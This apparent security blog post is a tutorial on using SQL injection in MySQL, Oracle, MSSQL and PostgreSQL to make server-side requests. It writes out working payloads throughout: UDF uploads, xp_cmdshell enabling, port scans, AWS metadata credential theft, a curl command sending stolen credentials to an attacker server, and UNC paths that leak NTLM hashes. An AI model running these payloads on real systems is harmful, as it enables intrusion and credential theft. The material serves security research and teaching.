---
title: "Using SQL Injection to perform SSRF/XSPA attacks"
date: 2020-06-28
categories:
- sql injection
- ssrf
- xspa
- cloud
- aws
- penetration testing
- offsec
- mysql
- oracle
- mssql
- postgresql
- bugbounty
tags:
- security-credentials
- iam
- aws
- ssrf
- sqli
- mysql
- oracle
- mssql
- postgresql
- bugbounty

thumbnailImagePosition: left
thumbnailImage: /img/using-sql-injection-to-perform-ssrf-xspa-attacks/1.png
---

A blog post about some post exploitation scenarios with MySQL, MSSQL, PostgreSQL and Oracle that use SQL Injection to make network requests resulting in Server Side Request Forgery/Cross Site Port Attacks.

<!--more-->

You can skip to the section that interests you

- [Introduction](#introduction)
- [Why is this worth the effort again?](#why-is-this-worth-the-effort-again)
- [Some assumptions](#some-assumptions)
- [MySQL/MariaDB/Percona](#mysqlmariadbpercona)
	- [Using LOAD_FILE/LOAD DATA/LOAD XML](#using-load_fileload-dataload-xml)
	- [Using User Defined Functions](#using-user-defined-functions)
- [Oracle](#oracle)
	- [Oracle packages that support a URL or a Hostname/Port Number specification](#oracle-packages-that-support-a-url-or-a-hostnameport-number-specification)
		- [DBMS_LDAP.INIT](#dbms_ldapinit)
		- [UTL_SMTP](#utl_smtp)
		- [UTL_TCP](#utl_tcp)
		- [UTL_HTTP and Web Requests](#utl_http-and-web-requests)
- [MSSQL](#mssql)
	- [Limited SSRF using master..xp_dirtree (and other file stored procedures)](#limited-ssrf-using-masterxp_dirtree-and-other-file-stored-procedures)
	- [master..xp_cmdshell](#masterxp_cmdshell)
	- [MSSQL User Defined Function - SQLHttp](#mssql-user-defined-function---sqlhttp)
- [PostgreSQL](#postgresql)
	- [Using the COPY function](#using-the-copy-function)
	- [DBLINK Module](#dblink-module)
	- [Using custom Extensions](#using-custom-extensions)
- [Final thoughts](#final-thoughts)
- [References, all URLs from the post and further reading](#references-all-urls-from-the-post-and-further-reading)

## Introduction

SQL Injection is a well known, researched and publicized security vulnerability that has been used to attack web apps and steal data from backend databases for multiple decades now. Post exploitation scenarios with SQL Injections commonly lead to, apart from the ability to interact with the database, the ability to read files, write files and sometimes to execute operating system commands.

All modern databases have built-in functions or the ability to create procedures that provide some level of network access. These are used for database related operations, usually to fetch data from a file on a network share or on the Internet or to initiate connections to other servers etc.

As attackers, SQL Injection often provides us the ability to interact with the database and call these functions. Again, these are well documented in a category of data extraction techniques called Out of Band Exploitation where data is exfiltrated through DNS or HTTP channels.

This post highlights functions, packages, methods and techniques in 4 of the most popular RDBMS software - MySQL, MSSQL, PostgreSQL and Oracle, that can be used either via a SQL Injection or via a direct connection to the database to perform network requests resulting in Server Side Request (Forgeries).

## Why is this worth the effort again?

Imagine you have found a SQL Injection on a web application on the Internet. DNS records show that this is located on AWS. SQL Injection on a web application on AWS is no different than any other web app. What can you do as part of post exploitation, apart from data exfil?

One of the key things that I personally go after when testing applications on AWS is the potential that the app may allow me to interact with the instance metadata service. <a href="https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed " target="_blank" rel="noopener noreferrer">There are a lot of cool things you can do, if you get your hands on privileged tokens from the instance generated using an attached IAM role</a>.

As an attacker, one of the ways to move from attacking the application server or the database to attacking the entire AWS infrastructure will require the ability to generate and extract credentials from the instance metadata service. This is often straightforward to do from a vanilla SSRF, but is there a way to do this using a SQL Injection? This blogpost attempts to provide some of the potential ways to make network requests and read them, all using SQL queries, across different database software.


## Some assumptions

We have to make some key assumptions here. Although, many of these assumptions may not hold true and you could still perform variations of what is covered in here to make the network requests

1. The backend database which the application queries and uses as a datastore is not a managed service like RDS or Azure Database. These services do not provide complete access to functions or restrict privileges to database users in such a way that file or network operations are restricted by design. For example, <a href="https://forums.aws.amazon.com/message.jspa?messageID=162499#162499" target="_blank" rel="noopener noreferrer">the AWS RDS user does not have the FILE_PRIV although the user appears to have full administrative access to the database.</a>
2. The database connector being used in the application (and subsequently the database itself) supports stacked (multi) queries. Not a strict requirement per se, but makes life a lot easier if queries can be stacked one after the other. This simply means that using SQL Injection we should be able to run multiple queries using a database query separator, for example: `' or 1 in (SELECT @@version);UPDATE users set user='newuser' where id=5; -- //`
3. Outbound network connectivity is allowed. This is not a strict requirement, especially when your only objective is to use the SQL Injection to access the instance metadata service accessible at `http://169.254.169.254/`.

> The techniques mentioned in this post can be used via a SQL Injection through a web/network app or by directly connecting to a database server using a client, as only the relevant database functions and approaches are covered. Creating queries or subqueries that will work through an injection point is left to the reader as these are very contextual.

## MySQL/MariaDB/Percona

<a href="https://www.percona.com/blog/2017/11/02/mysql-vs-mariadb-reality-check/" target="_blank" rel="noopener noreferrer">Although different in a lot of ways when it comes to licensing, protocols and security</a>, all three support common functions/techniques that can be used to make server side requests.

### Using LOAD_FILE/LOAD DATA/LOAD XML

Every SQL Out of Band data exfiltration article will use the `LOAD_FILE()` string function to make a network request. The function itself has its own limitations based on the operating system it is run on and the settings with which the database was started.

For example, if the `secure_file_priv` global variable was not set, the <a href="https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html"  target="_blank" rel="noopener noreferrer">default value is set to `/var/lib/mysql-files/`</a>, which means that you can only use functions like `LOAD_FILE('filename')` or `LOAD DATA [LOCAL] INFILE 'filename' INTO TABLE tablename` to read files from the `/var/lib/mysql-files/` directory. To be able to perform reads on files outside this directory, the `secure_file_priv` option has to be set to `""` which can only be done by updating the database configuration file or by passing the `--secure_file_priv=""` as a startup parameter to the database service.

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/2.png)

Nevertheless, under circumstances where `secure_file_priv` is set to `""`, we should be able to read other files on the system, assuming file read perms and `file_priv` is set to `Y` in `mysql.user` for current database user. However, being able to use these functions to make network calls is very operating system dependent. As these functions are built only to read files, the only network relevant calls that can be made are to UNC paths on Windows hosts as the <a href="https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file" target="_blank" rel="noopener noreferrer">Windows `CreateFileA` api that is called when accessing a file understands UNC naming conventions</a>.

So if your target database is running on a Windows machine the injection query `x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //` would <a href="https://packetstormsecurity.com/files/140832/MySQL-OOB-Hacking.html" target="_blank" rel="noopener noreferrer">result in the Windows machine sending out NTLMv2 hashes in an attempt to authenticate with the attacker controlled `\\attackerserver.example.com`</a>.

This Server Side Request Forgery, although useful, is restricted to only TCP port 445. You cannot control the port number, but can read information from shares setup with full read privs. Also, as has been shown with older research, you can use this limited SSRF capability to steal hashes and relay them to get shells, so it's definitely useful.

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/3.png)


### Using User Defined Functions

Another cool technique with MySQL databases is the ability to use User Defined Functions (UDF) present in external library files that if present in specific locations or system $PATH then can be accessed from within MySQL.

You could use a SQL Injection to write a library (`.so` or `.dll` depending on Linux or Windows), containing a User Defined Function that can make network/HTTP requests, that can be then invoked through additional queries.

This has its own set of restrictions though. Based on the version of MySQL, which you can identify with `select @@version`, the directory where plugins can be loaded from is restricted. MySQL below `v5.0.67` allowed for library files to be loaded from system path if the `plugin_dir` variable was not set. This has changed now and newer versions have the `plugin_dir` variable set to something like `/usr/lib/mysql/plugin/`, which is usually owned by root.

Basically for you to load a custom library into MySQL and call a function from the loaded library via SQL Injection, you would need the

- ability to write to the location specified in `@@plugin_dir` via SQL Injection
- `file_priv` set to `Y` in `mysql.user` for the current database user
- `secure_file_priv` set to `""` so that you can read the raw bytes of the library from an arbitrary location like the network or a file uploads directory in a web application.

Assuming the above conditions are met, you can use the classical approach of transferring the <a href="https://github.com/mysqludf/lib_mysqludf_sys" target="_blank" rel="noopener noreferrer">popular MySQL UDF `lib_mysqludf_sys` library</a> to the database server. You would then be able to make operating system command requests like `cURL` or `powershell wget` to perform SSRF using the syntax 

`x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

There are a lot of other functions declared in this library, an analysis of which can be seen <a href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation/" target="_blank" rel="noopener noreferrer">here</a>. If you are lazy like me, you can grab a copy of this UDF library, for the target OS, from a metasploit installation from the `/usr/share/metasploit-framework/data/exploits/mysql/` directory and get going.

Alternatively, UDF libraries have been created to specifically provide the database the ability to make HTTP requests. You can use <a href="https://github.com/y-ken/mysql-udf-http" target="_blank" rel="noopener noreferrer">MySQL User-defined function (UDF) for HTTP GET/POST</a> to get the database to make HTTP requests, using the following syntax

`x'; SELECT http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

You could also <a href="https://pure.security/simple-mysql-backdoor-using-user-defined-functions/" target="_blank" rel="noopener noreferrer">create your own UDF and use that for post exploitation as well.</a>

In any case, you need to transfer the library to the database server. You can do this in multiple ways

1. Use the MySQL `hex()` string function or something like `xxd -p filename.so | tr -d '\n'` to convert the contents of the library to hex format and then dumping it to the `@@plugin_dir` directory using `x'; SELECT unhex(0x1234abcd12abcdef1223.....) into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`
2. Alternatively, convert the contents of `filename.so` to base64 and use `x';select from_base64("AAAABB....") into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`


If the `@@plugin_dir` is not writable, then you are out of luck if the version is above `v5.0.67`. Otherwise, write to a different location that is in path and load the UDF library from there using

- for the `lib_mysqludf_sys` library - `x';create function sys_eval returns string soname 'lib_mysqludf_sys.so'; -- //`
- for the `mysql-udf-http` library - `x';create function http_get returns string soname 'mysql-udf-http.so'; -- //`

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/4.png)
![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/5.png)


For automating this, you can use SQLMap which supports <a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank" rel="noopener noreferrer">the usage of custom UDF via the `--udf-inject` option</a>.

For Blind SQL Injections you could redirect output of the UDF functions to a temporay table and then read the data from there or use <a href="https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration" target="_blank" rel="noopener noreferrer">DNS request smuggled inside a `sys_eval` or `sys_exec` curl command</a>.

## Oracle

Using Oracle to do Out of Band HTTP and DNS requests is well documented but as a means of exfiltrating SQL data in injections. We can always modify these techniques/functions to do other SSRF/XSPA.

Installing Oracle can be really painful, especially if you want to set up a quick instance to try out commands. My friend and colleague at Appsecco, Abhisek Datta, pointed me to https://github.com/MaksymBilenko/docker-oracle-12c that allowed me to setup an instance on a t2.large AWS Ubuntu machine and Docker.

I ran the docker command with the `--network="host"` flag so that I could mimic Oracle as an native install with full network access, for the course of this blogpost.

```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c 
```

### Oracle packages that support a URL or a Hostname/Port Number specification

In order to find any packages and functions that support a host and port specification, I ran a Google search on the <a href="https://docs.oracle.com/database/121/index.html">Oracle Database Online Documentation</a>. Specifically,

```bash
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```

The search returned the following results (not all can be used to perform outbound network)

- DBMS_NETWORK_ACL_ADMIN
- UTL_SMTP
- DBMS_XDB
- DBMS_SCHEDULER
- DBMS_XDB_CONFIG
- DBMS_AQ
- UTL_MAIL
- DBMS_AQELM
- DBMS_NETWORK_ACL_UTILITY
- DBMS_MGD_ID_UTL
- UTL_TCP
- DBMS_MGWADM
- DBMS_STREAMS_ADM
- UTL_HTTP

This crude search obviously skips packages like `DBMS_LDAP` (which allows passing a hostname and port number) as <a href="https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360">the documentation page</a> simply points you to a <a href="https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360">different location</a>. Hence, there may be other Oracle packages that can be abused to make outbound requests that I may have missed.

In any case, let's take a look at some of the packages that we have discovered and listed above.

#### DBMS_LDAP.INIT

The `DBMS_LDAP` package allows for access of data from LDAP servers. The `init()` function initializes a session with an LDAP server and takes a hostname and port number as an argument.

This function has been documented before to show exfiltration of data over DNS, like below

```sql
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```

However, given that the function accepts a hostname and a port number as arguments, you can use this to work like a port scanner as well.

Here are a few examples

```sql
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/18.png)

A `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` shows that the port is closed while a session value points to the port being open.

#### UTL_SMTP

The `UTL_SMTP` package is designed for sending e-mails over SMTP. The example provided on the <a href="https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478" target="_blank">Oracle documentation site shows how you can use this package to send an email</a>. For us, however, the interesting thing is with the ability to provide a host and port specification.

A crude example is shown below with the `UTL_SMTP.OPEN_CONNECTION` function, with a timeout of 2 seconds

```sql
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```sql
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/19.png)

A `ORA-29276: transfer timeout` shows port is open but no SMTP connection was estabilished while a `ORA-29278: SMTP transient error: 421 Service not available` shows that the port is closed.

#### UTL_TCP

The `UTL_TCP` package and its procedures and functions allow <a href="https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190" target="_blank">TCP/IP based communication with services</a>. If programmed for a specific service, this package can easily become a way into the network or perform full Server Side Requests as all aspects of a TCP/IP connection can be controlled.

The example <a href="https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190" target="_blank">on the Oracle documentation site shows how you can use this package to make a raw TCP connection to fetch a web page</a>. We can simply it a little more and use it to make requests to the metadata instance for example or to an arbitrary TCP/IP service.

```sql
set serveroutput on size 30000;
SET SERVEROUTPUT ON 
DECLARE c utl_tcp.connection;
  retval pls_integer; 
BEGIN
  c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
  retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
  retval := utl_tcp.write_line(c);
  BEGIN
    LOOP
      dbms_output.put_line(utl_tcp.get_line(c, TRUE));
    END LOOP;
  EXCEPTION
    WHEN utl_tcp.end_of_input THEN
      NULL;
  END;
  utl_tcp.close_connection(c);
END;
/
```

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/20.png)

```sql
DECLARE c utl_tcp.connection;
  retval pls_integer; 
BEGIN
  c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
  retval := utl_tcp.write_line(c);
  BEGIN
    LOOP
      dbms_output.put_line(utl_tcp.get_line(c, TRUE));
    END LOOP;
  EXCEPTION
    WHEN utl_tcp.end_of_input THEN
      NULL;
  END;
  utl_tcp.close_connection(c);
END;
```

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/21.png)

Interestingly, due to the ability to craft raw TCP requests, this package can also be used to query the Instance meta-data service of all cloud providers as the method type and additional headers can all be passed within the TCP request.

#### UTL_HTTP and Web Requests

Perhaps the most common and widely documented technique in every Out of Band Oracle SQL Injection tutorial out there is the <a href="https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070">`UTL_HTTP` package</a>. This package is defined by the documentation as - `The UTL_HTTP package makes Hypertext Transfer Protocol (HTTP) callouts from SQL and PL/SQL. You can use it to access data on the Internet over HTTP.`

```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/16.png)

You could additionally, use this to perform some rudimentary port scanning as well with queries like

```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/17.png)

A `ORA-12541: TNS:no listener` or a `TNS:operation timed out` is a sign that the TCP port is closed, whereas a `ORA-29263: HTTP protocol error` or data is a sign that the port is open.

Another package I have used in the past with varied success is the <a href="https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705" target="_blank"> `GETCLOB()` method of the `HTTPURITYPE` Oracle abstract type</a> that allows you to interact with a URL and provides support for the HTTP protocol. The `GETCLOB()` method is used to fetch the GET response from a URL as a <a href="https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html" target="_blank">CLOB data type.


```
select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;
```

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/22.png)

## MSSQL

Microsoft SQL Server provides multiple extended stored procedures that allow you to interact with not only the network but also the file system and even the <a href="https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/" target="_blank">Windows Registry</a>.

One technique that keeps coming up is the usage of the undocumented stored procedure `xp_dirtree` that allows you to list the directories in a folder. This stored procedure supports UNC paths, which can be abused to leak Windows credentials over the network or extract data using DNS requests.

If you are able to execute operating system commands, then you could invoke Powershell to make a curl (`Invoke-WebRequest`) request. You could do this via the hacker favorite `xp_cmdshell` as well.

Alternatively, you could also use a User Defined Function in MSSQL to load a DLL and use the dll to make the request from inside MSSQL directly.

Let's look at the above techniques in a little more detail.

### Limited SSRF using master..xp_dirtree (and other file stored procedures)

The most common method to make a network call you will come across using MSSQL is the usage of the Stored Procedure `xp_dirtree`, which weirdly is undocumented by Microsoft, which caused it to be <a href="https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/" target="_blank">documented by other folks on the Internet</a>. This method has been used in <a href="https://www.notsosecure.com/oob-exploitation-cheatsheet/" target="_blank"> multiple examples</a> of <a href="https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/" target="_blank">Out of Band Data exfiltration</a> posts on the Internet.

Essentially,

```
DECLARE @user varchar(100);
SELECT @user = (SELECT user);  
EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
```

Much like MySQL's `LOAD_FILE`, you can use `xp_dirtree` to make a network request to only TCP port 445. You cannot control the port number, but can read information from network shares. Addtionally, much like any UNC path access, <a href="https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478" target="_blank">Windows hashes will be sent over to the network that can be captured and replayed for further exploitation</a>.

**PS:** This does not work on `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` running on a `Windows Server 2016 Datacenter` in the default config.

There are other stored procedures <a href="https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx" target="_blank"> like `master..xp_fileexist` </a>etc. as well that can be used for similar results.

### master..xp_cmdshell

The extended stored procedure <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql" target="_blank">`xp_cmdshell` spawns a Windows command shell and executes the string passed to it, returning any rows of text</a>. This command is run as the SQL Server service account.

`xp_cmdshell` is disabled by default. You can enable it using the SQL Server Configuration Option. Here's how

```
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
GO
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
GO
exec master..xp_cmdshell 'whoami'
GO
```

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/13.png)

You could use something like <a href="https://github.com/besimorhino/powercat" target="_blank">PowerCat</a>, download the Windows port of netcat/ncat, <a href="https://livebook.manning.com/book/powershell-deep-dives/chapter-4/9" target="_blank">use raw TCP Client for arbitrary ports</a>, or simply invoke Powershell's `Invoke-WebRequest` to make HTTP requests to perform Server Side queries.

```
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
exec ('master..xp_cmdshell ''powershell -exec -bypass -c ""(iwr '+@url+').Content""''');
GO
```

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/14.png)

You can additionally pass other headers and change the HTTP method as well to access data on services that need a POST or PUT instead of a GET like in the case of IMDSv2 for AWS or a special header like `Metadata: true` in the case of Azure or the `Metadata-Flavor: Google` for GCP.

### MSSQL User Defined Function - SQLHttp

It is fairly straightforward to write a CLR UDF (Common Language Runtime User Defined Function - code written with any of the .NET languages and compiled into a DLL) and load it within MSSQL for custom functions. This, however, requires `dbo` access so may not work unless the web application connection to the database as `sa` or an Administrator role.

<a href="https://github.com/infiniteloopltd/SQLHttp" target="_blank">This Github repo has the Visual Studio project and the installation instructions</a> to load the binary into MSSQL as a CLR assembly and then invoke HTTP GET requests from within MSSQL.

The <a href="" target="_blank">`http.cs` code uses the `WebClient` class to make a GET request and fetch the content</a> as specified

```code
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
    [Microsoft.SqlServer.Server.SqlFunction]
    public static SqlString http(SqlString url)
    {
        var wc = new WebClient();
        var html = wc.DownloadString(url.Value);
        return new SqlString (html);
    }
}
```

In the installation instructions, run the following before the `CREATE ASSEMBLY` query to add the SHA512 hash of the assembly to the list of trusted assemblies on the server (you can see the list using `select * from sys.trusted_assemblies;`)

```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```

Once the assembly is added and the function created, we can run the following to make our HTTP requests

```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/15.png)

## PostgreSQL

Also known as Postgres, is a free and open source RDBMS. This database contains multiple functions and has support to perform network lookups using extensions that can be enabled with superuser rights.

Additionally, <a href="https://www.postgresql.org/docs/9.1/functions-admin.html#FUNCTIONS-ADMIN-GENFILE" target="_blank" rel="noopener noreferrer">Generic File Access functions like `pg_read_file()` and `pg_read_binary_file()` exist</a> but cannot be used to read UNC paths or other files as these functions are restricted to read only within the `data_directory` variable value.

Here are some other ways by which we can invoke network requests from a PostgresSQL server.

### Using the COPY function

Postgres supports other ways of interacting with the file system which in the case of Windows servers can be used to make SSRF requests to UNC paths. For example, <a href="https://www.postgresql.org/docs/9.2/sql-copy.html">the `COPY` command can be used to copy data between a file and table</a> and supports both `COPY TO` file and `COPY FROM`.

As an example, you can run `copy (select 1) to '/tmp/bb.txt';`. This will create a file at `/tmp/bb.txt` with the content `1`. Unfortunately, you cannot use `COPY TO` to write an extension library to `$libdir` because the `$libdir` directory and the database server process is owned by two different users.

However the most interesting use case of the `COPY` function is its ability to call external programs! Surprisingly, the documentation includes no references to this ability, you can use `COPY` to invoke an external program like `curl` for example.

If the returned data from the execution of the program is not properly formatted CSV, it results in import errors. That should not stop us however from executing programs and making requests as we can always send the output of a program to an attacker controlled server and read it through the logs.

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/10.png)

To use `COPY` to do SSRF, we can run the following sequence of commands to setup an empty table (to avoid errors) and then execute cURL to retrieve and send data to a collection server. The collection server is a <a href="https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7">simple python3 `http.server` implementation that logs GET and POST variables</a>.

```sql
CREATE TABLE test();
COPY test from PROGRAM 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ ';
COPY test from PROGRAM 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole -o /tmp/creds';
COPY test from PROGRAM 'curl -F "data=@/tmp/creds" http://attacker-collection-server/';
```

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/11.png)

The collection server logs will show the contents of the `/tmp/creds` file POSTed from within Postgres

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/12.png)

Given that this allows us the execution of `cURL` in all it's glory, we can even use this to query the Instance meta-data service of all cloud providers as the method type and additional headers can all be passed as arguments to `cURL`.

Alternatively, there are documented ways of using `COPY FROM` to perform NTLM hash leak and to perform Out of Band SQL Injection Exploitation, but I had no luck with that on `PostgreSQL 10.13 on a Windows 10.0.18362` box. Obviously, these are supposed to work on Windows boxes as UNC paths are a Windows thing. The queries that should work and leak creds or perform OOBE are shown below

```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$ 
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN 
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```

### DBLINK Module

The `dblink` is a module that supports connections to other PostgreSQL databases from within a database session. It supports <a href="https://www.postgresql.org/docs/9.6/dblink.html" target="_blank" rel="noopener noreferrer">numerous functions to open database connections to remote servers</a> and perform actions on them.

Of the functions listed at `https://www.postgresql.org/docs/9.6/dblink.html`, the `dblink_connect_u()` stands out from the context of an attacker. According to the documentation, `dblink_connect_u()` is identical to `dblink_connect()`, except that it <a href="https://www.postgresql.org/docs/9.6/contrib-dblink-connect-u.html" target="_blank" rel="noopener noreferrer">will allow non-superusers to connect using any authentication method</a>. 

All functions that <a href="https://www.postgresql.org/docs/9.1/libpq-connect.html" target="_blank" rel="noopener noreferrer">support using a `connstr` string in the function call can be used to set the remote host and port for the database connection</a>. Although, you cannot control the data that is being sent to the remote server, you can identify what ports are open.

To abuse this function to port scan internal servers or servers on the Internet, use the following syntax

`CREATE extension dblink;`
`SELECT dblink_connect_u('host=scanme.nmap.org port=22 sslmode=disable');`

For open ports, Postgres will respond with the following or a variant of

```text
ERROR:  could not establish connection
DETAIL:  expected authentication request from server, but received S
```

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/6.png)

For closed ports, a message like the following is shown

```text
ERROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
	Is the server running on host "scanme.nmap.org" (45.33.32.156) and accepting
	TCP/IP connections on port 5000?
could not connect to server: Network is unreachable
	Is the server running on host "scanme.nmap.org" (2600:3c01::f03c:91ff:fe18:bb2f) and accepting
	TCP/IP connections on port 5000?
```

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/7.png)

The `dblink` functions are also often used to perform SQL Injection data exfiltration attacks over DNS.

### Using custom Extensions

Custom extensions are a very cool way of adding functionality to Postgres. You can create your own extension and add them to Postgres but that involves you <a href="https://www.percona.com/blog/2019/04/05/writing-postgresql-extensions-is-fun-c-language/">writing a standard Makefile, a control file, a library and then placing the library in the Postgres `$libdir` (which on 10 is at `/usr/lib/postgresql/10/lib`)</a>.

Alternatively, you can write the extension and load it at runtime using `CREATE FUNCTION` instead of loading it using `CREATE EXTENSION`.

To build your own custom extension as an attacker, you need, as a bare minimum, a Makefile, a control file and the C program containing the extension code. You will need the header files, the extension build tools and the database cluster manager which can be setup with

```bash
sudo apt-get install libpq-dev
sudo apt-get install postgresql-server-dev-all
sudo apt-get install postgresql-common
```

You can then load a function from the extension using a syntax similar to the following

`CREATE OR REPLACE FUNCTION pg_runcmd(cstring) RETURNS int AS '/tmp/extension.so', 'pg_runcmd' LANGUAGE C STRICT;`

where `pg_runcmd` is a C function implemented in `extension.so`.

I did not have much luck with loading a simple C extension as I kept getting a `Extension libraries are required to use the PG_MODULE_MAGIC macro` error, even when the C code has the macro present. If any reader can get this working, it would be awesome! The code for an extension that I was trying to write that ought to allow command execution is at <a href=https://github.com/riyazwalikar/postgres-runcmd-extension>https://github.com/riyazwalikar/postgres-runcmd-extension</a>. This is far from complete!

In any case, there are extensions available that allow you to perform HTTP GET, POST and more requests from within the database. A very cool example is <a href="https://github.com/pramsey/pgsql-http">https://github.com/pramsey/pgsql-http</a>. This extension uses `libcurl` to make HTTP requests and supports loads of features with support to make custom requests as well. Here's an example

`SELECT content FROM http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/');`

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/8.png)

`SELECT content FROM http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole');`

![](/img/using-sql-injection-to-perform-ssrf-xspa-attacks/9.png)

The obvious limitations of this are

- The `pgsql-http` extension (or any other extension, unless already present in the `$pglibdir` according to `pg_config`) cannot be loaded without them being installed on the system
- installation requires root shell access
- you could use the `CREATE FUNCTION` and <a href="https://www.postgresql.org/docs/10/sql-createfunction.html">the external `obj_file` path to load a library</a> and call a function in it (much like MySQL UDFs) but I ran into errors that said `ERROR:  could not lookup 'http' extension oid` when calling the function after it was supposedly successfuly created

So for now, run `SELECT * FROM pg_available_extensions;` to see what extensions are available and use `CREATE Extension` to load something that you find useful for your usecase. For example, <a href="https://www.postgresql.org/about/news/1407/">the `xml2` extension has been known to be vulnerable to arbitrary file read and writes in the past</a>.

## Final thoughts

Server Side Request Forgeries are a fun class of vulnerabilities to exploit and is not restricted only to attacks made through web applications. As seen with the examples covered in this post, SSRF/XSPA can afflict any system where the server makes a network connection to the user provided host (or/and port number). Like the database examples listed above, other categories of software products are also going to be vulnerable if user input is not contextually sanitised.

## References, all URLs from the post and further reading

